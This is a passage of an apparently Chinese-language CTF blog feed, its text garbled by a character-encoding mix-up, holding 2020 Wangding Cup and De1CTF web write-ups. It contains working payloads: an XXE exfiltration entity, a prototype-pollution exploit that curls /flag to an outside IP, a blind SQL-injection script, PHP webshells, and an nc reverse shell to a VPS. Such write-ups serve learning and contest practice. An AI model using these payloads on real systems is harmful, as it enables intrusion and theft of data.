payl SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://xxxxxxxx/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>ç›‘å¬80ç«¯å£æ”¶åˆ°flag<br><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/3.png" class="lazyload" data-srcset="3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>æºç </p><pre><code class="javascript">var express = require(&#39;express&#39;);var path = require(&#39;path&#39;);const undefsafe = require(&#39;undefsafe&#39;);const { exec } = require(&#39;child_process&#39;);var app = express();class Notes {    constructor() {        this.owner = &quot;whoknows&quot;;        this.num = 0;        this.note_list = {};    }    write_note(author, raw_note) {        this.note_list[(this.num++).toString()] = {&quot;author&quot;: author,&quot;raw_note&quot;:raw_note};    }    get_note(id) {        var r = {}        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    }    edit_note(id, author, raw) {        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    }    get_all_notes() {        return this.note_list;    }    remove_note(id) {        delete this.note_list[id];    }}var notes = new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));app.set(&#39;view engine&#39;, &#39;pug&#39;);app.use(express.json());app.use(express.urlencoded({ extended: false }));app.use(express.static(path.join(__dirname, &#39;public&#39;)));app.get(&#39;/&#39;, function(req, res, next) {  res.render(&#39;index&#39;, { title: &#39;Notebook&#39; });});app.route(&#39;/add_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &#39;please use POST to add a note&#39;});    })    .post(function(req, res) {        let author = req.body.author;        let raw = req.body.raw;        if (author &amp;&amp; raw) {            notes.write_note(author, raw);            res.render(&#39;mess&#39;, {message: &quot;add note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;did not add note&quot;});        }    })app.route(&#39;/edit_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to edit a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        let author = req.body.author;        let enote = req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) {            notes.edit_note(id, author, enote);            res.render(&#39;mess&#39;, {message: &quot;edit note sucess&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;edit note failed&quot;});        }    })app.route(&#39;/delete_note&#39;)    .get(function(req, res) {        res.render(&#39;mess&#39;, {message: &quot;please use POST to delete a note&quot;});    })    .post(function(req, res) {        let id = req.body.id;        if (id) {            notes.remove_note(id);            res.render(&#39;mess&#39;, {message: &quot;delete done&quot;});        } else {            res.render(&#39;mess&#39;, {message: &quot;delete failed&quot;});        }    })app.route(&#39;/notes&#39;)    .get(function(req, res) {        let q = req.query.q;        let a_note;        if (typeof(q) === &quot;undefined&quot;) {            a_note = notes.get_all_notes();        } else {            a_note = notes.get_note(q);        }        res.render(&#39;note&#39;, {list: a_note});    })app.route(&#39;/status&#39;)    .get(function(req, res) {        let commands = {            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        };        for (let index in commands) {            exec(commands[index], {shell:&#39;/bin/bash&#39;}, (err, stdout, stderr) =&gt; {                if (err) {                    return;                }                console.log(`stdout: ${stdout}`);            });        }        res.send(&#39;OK&#39;);        res.end();    })app.use(function(req, res, next) {  res.status(404).send(&#39;Sorry cant find that!&#39;);});app.use(function(err, req, res, next) {  console.error(err.stack);  res.status(500).send(&#39;Something broke!&#39;);});const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))</code></pre><p>è€å®è¯´ä¸€å¼€å§‹å®¡å®Œæºç æ²¡å•¥æ”¶è·ã€‚å¤§æ¦‚çš„æ€è·¯æ˜¯,é¢˜ç›®å·²ç»æœ‰äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆæˆ‘è¦æ˜¯èƒ½ä¿®æ”¹å®ƒå›ºå®šæ­»çš„å‘½ä»¤å†…å®¹å°±èƒ½ä»»æ„æ‰“äº†ã€‚ä½†æ˜¯è¿™ç§è¾¾æˆè‚¯å®šæ˜¯è¦åŸå‹é“¾æ±¡æŸ“çš„ã€‚æˆ‘æ²¡çœ‹åˆ°<code>merge()</code>ä¹‹ç±»çš„å‡½æ•°å°±æ²¡ç»§ç»­æƒ³äº†</p><p>ç„¶åä¹‹åå‘ç°è¿™é¢˜å±…ç„¶æœ‰åŸé¢˜å‚è€ƒçš„â€¦<br><a href="https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api" target="_blank" rel="noopener">https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-api</a><br>ä»”ç»†çœ‹äº†ä¸‹å‘ç°å¥½åƒå‡ ä¹ä¸€æ ·å•Šã€‚åªæœ‰ä¸€ä¸ªundefsafeä¾èµ–çš„åŒºåˆ«.<br>ç„¶åå°±å‘ç°è¿™ä¸ªä¾èµ–æœç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜</p><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">Prototype Pollution</a></p><pre><code class="javascript">var a = require(&quot;undefsafe&quot;);var payload = &quot;__proto__.toString&quot;;a({},payload,&quot;JHU&quot;);console.log({}.toString);</code></pre><p>å‚ç…§è¿™ä¸ªä¾‹å­,æˆ‘ä»¬å¾ˆå¿«å°±èƒ½æ‰¾åˆ°åŸå‹é“¾çš„æ±¡æŸ“ç‚¹åœ¨edit_noteè¿™ã€‚</p><pre><code class="javascript"> edit_note(id, author, raw) {        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    }</code></pre><p>ç„¶åæŒ‰wpçš„payloadæ”¹å°±è¡Œäº†</p><pre><code class="python">import requestss = requests.session()data={&#39;raw&#39;:&#39;curl 120.27.246.202/?`cat /flag`&#39;,&#39;id&#39;:&#39;__proto__&#39;,&#39;author&#39;:&#39;byc_404&#39;}url=&#39;http://bed4f32827b843ca9ad5b763749970dd265f40236d544ada.cloudgame1.ichunqiu.com:8080/&#39;r=s.post(url+&#39;edit_note&#39;,json=data)print(r.text)r=s.get(url+&quot;status&quot;)print(r.text)</code></pre><p>è¿™é‡Œidæ±¡æŸ“äº†åç”¨rawæˆ–è€…authorä¸¤ä¸ªå±æ€§éƒ½èƒ½å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºå›æ˜¾çš„åŸå› æˆ‘ä»¬é€‰æ‹©curlå¤–å¸¦æ•°æ®</p><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/4.png" class="lazyload" data-srcset="4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>è¿™é¢˜æ²¡åšå‡ºæ¥ç¡®å®ä¸å¤ªåº”è¯¥ã€‚èµ›åæŒ‰éƒå¸ˆå‚…çš„æ€è·¯æœç„¶ä¸€ä¸‹å°±å‡ºäº†ã€‚ä¸è¿‡ä¹Ÿè¯æ˜sqlé‡Œçš„æŠ€å·§ç¡®å®ä¸å°‘å•Šã€‚</p><p>é¦–å…ˆå½“ç„¶æ˜¯sqlç±»å‹.é¢˜ç›®åªæœ‰ä¸€ä¸ª<code>register_do.php</code>,è€Œæ²¡æœ‰loginçš„åŠŸèƒ½ã€‚<br>æµ‹äº†ä¸€ä¼šåçªç„¶å‘ç°ï¼Œå›æ˜¾å˜æˆäº†<code>WTF???row&gt;20</code>è€Œä¸”ä½ çš„payloadæ€ä¹ˆæ”¹å›æ˜¾éƒ½ä¸€è‡´.<br>é‚£ä¹ˆæ­¤æ—¶å¯ä»¥å¤§è‡´æ¨æ–­ä¸‹ã€‚æˆ‘ä»¬çš„payloadæ˜¯è¢«æ‹¼æ¥è¿›äº†<code>insert into</code>è¯­å¥ã€‚å› æ­¤æ•°æ®åº“çš„è¿”å›ç»“æœæ‰ä¼šå¢å¤šåˆ°ä¸Šé™20ã€‚</p><p>é‚£ä¹ˆé¦–å…ˆçŒœæµ‹ç»“æ„ï¼Œæ„é€ payload<br><code>username=admin&#39;,if(1=1,sleep(5),1))#</code><br>ä¼šå‘ç°è™½ç„¶è¿”å›äº†504ã€‚ä½†æ˜¯çš„ç¡®å¯ä»¥å»¶æ—¶.<br>ç„¶è€Œå†æŒ‰ç…§è¿™ä¸ªæ€è·¯æ„é€ ç›²æ³¨payloadå´å‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½è·‘å‡ºä»€ä¹ˆç»“æœã€‚æ­¤æ—¶å†è®¿é—®<code>register_do.php</code>å‘ç°rowåˆè¶…å‡º20äº†.</p><p>æ‰€ä»¥å…³é”®å°±æ˜¯ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•ä¸å¢åŠ ç»“æœ,åŒæ—¶è¿˜èƒ½å»¶æ—¶ã€‚</p><p>è¿™é‡Œå°±å¾—è†œä¸€æ³¢éƒå¸ˆå‚…äº†ã€‚10åˆ†é’Ÿä¸åˆ°å°±èƒ½å‡ºç»“æœâ€¦<br>payload:</p><pre><code>1&#39;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),1,1))=102,pow(9999,100) or sleep(3),pow(9999,100)),&#39;1&#39;)#</code></pre><p>æ—¢ç„¶æ²¡æœ‰ä»€ä¹ˆwafã€‚æˆ‘ä»¬å°±æŠŠä¸»ä½“éƒ¨åˆ†å¸¦ä¸Šifå­—å¥è¿›è¡Œæ—¶é—´ç›²æ³¨çš„åˆ¤æ–­ã€‚ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬è®©ç»“æœåŒæ—¶<code>pow(9999,100)</code>ä¹Ÿå°±æ˜¯æŠ¥é”™ä¸€ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¸ç”¨æ‹…å¿ƒè¯­å¥æ•°è¶…è¿‡20çš„ä¸Šé™ã€‚</p><p>ç„¶åå‘ç°è¡¨åä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘ä¸å‡ºæ¥ã€‚ä½†æ˜¯å¯ä»¥ç›´æ¥å°è¯•flagè¡¨ç„¶åæ— åˆ—åæ³¨å…¥ã€‚</p><pre><code>select `2` from (select 1,2 union select * from flag)a limit 1,1</code></pre><p>exp</p><pre><code class="python">import requestsflag=&quot;&quot;for i in range(1,50):    print(i)    a=0    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz{}-&quot;:        url = &#39;http://1ff59e94406f4210a83ac8268a0037c3334b9006071c441b.changame.ichunqiu.com/register_do.php&#39;        payload = &quot;1&#39;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),&quot;+str(i)+&quot;,1))=&quot; + str(ord(j)) + &quot;,pow(99999,100) or sleep(3),pow(99999,100)),&#39;1&#39;)#&quot;        data = {            &#39;username&#39;: payload,            &#39;password&#39;: &#39;321&#39;        }        r = requests.post(url, data=data)        try:            r = requests.post(url, data=data, timeout=3.0)        except requests.exceptions.ReadTimeout:            flag+=j            print(flag)            a=1            break    if a==0:        break</code></pre><p><img src="/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WEB-writeup/5.png" class="lazyload" data-srcset="5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€å®è¯´æœ€ååå‡ åˆ†é’Ÿå¯èƒ½ä¸å¤Ÿåšå‡ºæ¥çš„å§ã€‚ä½†å¦‚æœæ›´æ—©ç‚¹æ•é”çš„å¯Ÿè§‰åˆ°è¿™ç§æ³¨å…¥å¹¶æ‰¾åˆ°æ‰‹æ®µå°±å¥½äº†â€¦ä½†æ˜¯è¿™é¢˜æ”¶è·è¿˜æ˜¯ä¸å°‘çš„ã€‚æ¯•ç«Ÿè‡ªå·±å¥½ä¹…æ²¡è§åˆ°insert_intoçš„ç›²æ³¨ã€‚æ‰‹æ³•ä¹Ÿç”Ÿç–äº†ä¸å°‘ã€‚sqlæ³¨å…¥çš„æŠ€å·§å­¦ä¹ è¿˜è¦ç»§ç»­åŠ æŠŠåŠ²å•Šã€‚</p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>ç½‘é¼ç»“æŸåè¿™ä¸ªæœˆè¿˜æœ‰ä¸å°‘å…¶ä»–æ¯”èµ›ã€‚ä¸è¿‡ä¼°è®¡æ²¡å¤šå°‘æ—¶é—´èŠ±åœ¨CTFä¸Šäº†ã€‚è¿™ä¸ªæœˆä¸€æ–¹é¢å¸Œæœ›æŠŠjava,æ¸—é€ç­‰æ–¹é¢çš„çŸ¥è¯†å†æ¥è§¦ä¸‹ã€‚ç„¶åæ¯”èµ›æ‰“å¥½ã€‚ç­‰ä¸‹ä¸ªæœˆå·®ä¸å¤šå°±è¦ä¸“æ³¨åœ¨å­¦ä¸šä¸Šäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF2020</title>
      <link href="2020/05/04/De1CTF2020writeup/"/>
      <url>2020/05/04/De1CTF2020writeup/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºåˆ°ç¬¬äºŒæ¬¡XCTFäº†ã€‚æ²¡æƒ³åˆ°De1taçš„é¢˜è¿™æ¬¡è¿™ä¹ˆé¡¶ï¼Œæœç„¶æ˜¯å‡ºç»™å›½é™…é˜Ÿä¼çš„éš¾åº¦ã€‚(è†œä¸€æ³¢å›½å†…å¤–å¤§ä½¬é˜Ÿä¼)<br>å°ç»¿è‰è¿™æ¬¡ä¹Ÿå°±æˆ‘ä»¬å¤§äºŒçš„å‡ ä¸ªåœ¨æ‰“ï¼Œå¤§å®¶åŸºæœ¬éƒ½è‡ªé—­äº†ã€‚WEBè‡ªå·±ä¹Ÿåªåšå‡ºä¸¤é“é¢˜ï¼Œè¯´å®è¯è¦æ˜¯è‡ªå·±JAVAçš„å­¦ä¹ è®¡åˆ’å†æå‰ä¸€ç‚¹çš„è¯è¯´ä¸å®šèƒ½æŠŠcalcé‚£é¢˜å‡ºäº†çš„â€¦<br>è¿™æ ·ä¹Ÿä¸è‡³äºè¢«å¡åœ¨20åå¼€å¤–ã€‚</p><p>ç­‰wpå‡ºæ¥è‡ªå·±äº‰å–æŠŠèƒ½åšçš„é¢˜éƒ½å¤ç°äº†ã€‚</p><a id="more"></a><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>è¿™é¢˜è¿˜ç®—æ¯”è¾ƒç®€å•.å°±æ˜¯è‡ªå·±ä¸€å¼€å§‹æ‰‹è´±é€‰çš„mixtureå»åšæµªè´¹äº†ä¸å°‘æ—¶é—´</p><p>é¦–å…ˆç®€å•ä¸Šä¼ FUZZä¸‹ï¼Œä¼šå‘ç°é™åˆ¶äº†filenameï¼Œfiletypeä»¥åŠfileçš„å†…å®¹<br>å…¶ä»–çš„éƒ½è¿˜å¥½ã€‚ä¸è¿‡å†…å®¹é»‘åå•é‡Œ<br><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents</code><br>ä¸»è¦æ˜¯ä¸€ä¸ªphçš„é—®é¢˜ã€‚å¯¹webshellè€Œè¨€,åº”è¯¥åªèƒ½ä½¿ç”¨ä¸é—­åˆçš„çŸ­æ ‡ç­¾äº†</p><p>ä½†æ˜¯å› ä¸ºæ–‡ä»¶åç¼€ä¸¥æ ¼é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æŒ‰ç…§è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ã€‚ç°åœ¨éœ€è¦.htaccessæ¥æ§åˆ¶è§£æå®ƒã€‚<br>å¹¸è¿çš„æ˜¯ï¼Œ.htaccesså¹¶æ²¡æœ‰è¢«é™åˆ¶<br>ä¸è¿‡æ³¨æ„ã€‚.htaccessä¸­å¸¸è§çš„å‡ ç§æŠŠ.jpgè§£ææˆphpçš„å†™æ³•ä¸­ï¼Œphpæ˜¯å¿…ä¸å¯å°‘çš„.é‚£å°±å¾—ç»•è¿‡é™åˆ¶ä¸Šä¼ </p><p>è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯äº†ï¼Œä¸€ç§æ˜¯ä¸Šä¼ cgiè¿›è¡Œgetshell,å½“æ—¶ç®€å•æœäº†ä¸‹å‘ç°ç¡®å®å¹¶ä¸éœ€è¦phpå‡ºç°</p><p>ä½†æ˜¯æ›´ç®€å•çš„æ˜¯æ¥è‡ªXNUCAçš„éé¢„æœŸè§£ã€‚ä½¿ç”¨\ç›´æ¥ç»•è¿‡wafã€‚<br>å³ä½¿æ˜¯.htaccessè¿™ç§è¯´æ³•ä¸Šä¸å…è®¸æ¢è¡Œçš„æ–‡ä»¶ï¼Œå®ƒä¹Ÿæ˜¯æ”¯æŒ<code>\</code>ç›´æ¥æ¢è¡Œçš„ï¼Œå› æ­¤è½»æ¾bypass</p><pre><code>addtype application/x-httpd-p\hp .jpg</code></pre><pre><code class="php">&lt;?=system(&#39;cat /flag&#39;);</code></pre><p><img src="/2020/05/04/De1CTF2020writeup/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>åšå®Œè¿™é¢˜çœŸçš„æ˜¯å¾—åº†å¹¸è‡ªå·±å½“åˆhtbåšäº†å°windowsçš„é¶æœºã€‚ä¸ç„¶è¿åšä¸‹å»çš„å‹‡æ°”éƒ½æ²¡æœ‰</p><p>æ¯”èµ›æ—¶æ²¡å’‹æˆªå›¾,å°†å°±ä¸‹çœ‹å§<br>é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯ç»™å‡ºçš„ä¸Šä¼ æºç </p><pre><code class="php">&lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if($_POST[&quot;submit&quot;]){    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            die($_FILES[&quot;file&quot;][&quot;error&quot;]);        }        else{            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;        }    }    else{        echo &quot;Not Allow!&quot;;    }}function Check(){    $BlackExts = array(&quot;php&quot;);    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);    $exts = trim(end($ext));    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp;         !in_array($exts, $BlackExts) &amp;&amp;         !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {          return true;    }    return false;}?&gt;</code></pre><p>webshellçš„é™åˆ¶,ä¸»è¦æ˜¯æ–‡ä»¶åç¼€è·Ÿå†…å®¹ã€‚<br>è‡ªå·±ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æ­£åˆ™å›æº¯ç»•ä¸‹<code>!preg_match()</code>ä½†æ˜¯å¾ˆå¿«å°±å‘ç°æ–‡ä»¶å¤ªå¤§ä¼ ä¸ä¸Šå»ã€‚<br>è€Œä¸”webshellè¿åˆ†å·éƒ½æ²¡äº†,ä¸å¥½æ„é€ ã€‚<br>ç»é˜Ÿå‹æé†’æ˜¯å°windowsé¶æœº,å¯ä»¥åˆ©ç”¨windwosä¸åŒºåˆ†å¤§å°å†™çš„ç‰¹æ€§ä¸Šä¼ ã€‚<br>åŒæ—¶å†…å®¹å¯ä»¥å‚è€ƒXCTFFINALlfi,ç”¨å…¨çŸ­æ ‡ç­¾æ„é€ æ— å­—æ¯æ•°å­—webshell<br>å¤§æ¦‚æ˜¯ä¸‹é¢è¿™æ ·çš„å§,å½“æ—¶è‡ªå·±å†™çš„ç”¨ä¸å‡ºæ¥ï¼Œå€Ÿäº†éƒå¸ˆå‚…çš„ç›´æ¥ä¸Šè½¦ã€‚</p><pre><code class="php">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&#39;_&#39;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_])?&gt;</code></pre><p>å½“æ—¶è¿˜é¡ºæ‰‹nmapæ‰«äº†ä¸‹</p><pre><code class="bash">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 13:27 CSTNmap scan report for 47.113.219.76Host is up (0.016s latency).Not shown: 997 filtered portsPORT     STATE  SERVICE       VERSION22/tcp   closed ssh80/tcp   open   http          Microsoft IIS httpd 8.5 (PHP 7.2.29)| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Unknown|_http-title: upload3389/tcp closed ms-wbt-serverService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 118.83 seconds</code></pre><p>ç„¶åæƒ³æŠ±éƒå¸ˆå‚…å¤§è…¿å¤±è´¥äº†â€¦åªèƒ½é è‡ªå·±äº†ã€‚<br>å› ä¸ºé¢˜ç›®åŒä¸€ä¸ªipè¢«å‡ºæˆä¸¤ä¸ªé¢˜ï¼ŒåŸºæœ¬å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¦ä¹ˆæ˜¯å•çº¯ææƒ,è¦ä¹ˆæ˜¯windowsåŸŸæ¸—é€ã€‚</p><p>è¿™é‡Œwindowsé¶æœºå…«æˆå°±æ˜¯ä¸ºäº†åŸŸæ¸—é€å‡†å¤‡çš„ã€‚</p><p>ç¡¬ç€å¤´çš®ä¸ç®¡3721å…ˆå¼¹ä¸ªshell<br>å½“æ—¶æ ¹ç›®å½•æœ‰åˆ«çš„å¸ˆå‚…ä¼ çš„NC,é‚£å°±ä¸ç”¨æˆ‘è‡ªå·±ä¼ äº†ã€‚</p><pre><code class="bash">.\nc.exe vpsip port -e powershell </code></pre><p>è¿™æ ·ä¸è‡³äºåœ¨uploadsç›®å½•è¢«åˆ æ—¶ä¸¢æ‰æ‰€æœ‰shell.<br>ç„¶åä¼ ä¸ªwinPEAS.exe è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚<br>è¿™ä¸ªä¹Ÿæ˜¯åšhtbæ—¶å­¦åˆ°çš„è„šæœ¬ï¼Œä¸€èˆ¬æ˜¯ä¸ºäº†ææƒæ‰«æä¸‹ã€‚åŸºæœ¬ä¸Šèƒ½æ»¡è¶³éœ€æ±‚ã€‚<br>ä¿¡æ¯é‡Œæœ‰ä¸€å¤„æ¯”è¾ƒæ˜æ˜¾<br><img src="/2020/05/04/De1CTF2020writeup/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 